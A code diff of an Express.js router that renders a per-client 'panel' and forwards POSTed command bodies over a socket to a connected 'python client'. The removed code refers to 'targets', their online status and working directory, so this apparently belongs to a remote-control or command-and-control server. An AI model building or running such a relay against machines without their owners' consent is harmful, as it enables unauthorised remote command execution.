@@ -1,42 +1,58 @@
-const express = require("express")
-const fs = require("fs")
+const express = require('express')
+const path = require("node:path")
+
+const clientManager = require('../utils/clientManager')
+const helpers = require('../utils/helpers')
+
 const router = express.Router()
-const path = require("path")
-const { ckeckOnlineTarget, base64Encoder } = require("../utils/server-helpers")
 
-router.route("/").get((req, res) => {
+router.get("/", (req, res) => {
     const { id } = req.query
 
-    if (id == undefined || id.length == 0) {
-        res.send("ID NOT FOUND")
-        return
+    if (!id) {
+        return res.redirect("/")
     }
 
-    const tarPath = path.join(process.__dirname, "public", "uploads", id)
-    if (!fs.existsSync(tarPath)) {
-        res.send("ID NOT FOUND")
-        return
-    }
-
-    const cwd = path.join(process.__dirname, "public", "uploads", id, "cwd")
-    if (!fs.existsSync(cwd)) {
-        fs.writeFileSync(cwd, "CWD")
-    }
-
-    const locationPath = fs.readFileSync(cwd, "utf-8")
+    const clientPath = path.join(process.__dirname, "public", "uploads", id)
+    const infoFile = path.join(clientPath, "info.json")
+    const info = helpers.readJson(infoFile)
     res.render("panel", {
-        id,
-        locationPath,
-        online: ckeckOnlineTarget(id),
+        info
     })
-}).post((req, res) => {
-    const { id } = req.query
+})
 
-    if (ckeckOnlineTarget(id)) {
-        IO.emit(`to-${id}`, base64Encoder(req.body))
-        res.send("OK")
-    } else {
-        res.send({ type: "error", message: "target offline" })
+router.post("/", async (req, res) => {
+    try {
+        const { id } = req.query
+        const body = req.body
+
+        if (!id) {
+            return res.json({
+                ack: false,
+                msg: "No ID found"
+            })
+        }
+
+        const pythonClient = clientManager.PYTHON_CLIENTS[id]
+        if (!pythonClient) {
+            return res.json({
+                ack: false,
+                msg: "Client not connected. Please try again."
+            })
+        }
+
+        // sending data to python client
+        pythonClient.emit("receiver", body)
+        
+        res.json({
+            ack: true,
+            msg: "Command received"
+        })
+    } catch (error) {
+        res.json({
+            ack: false,
+            msg: error.message
+        })
     }
 })
 
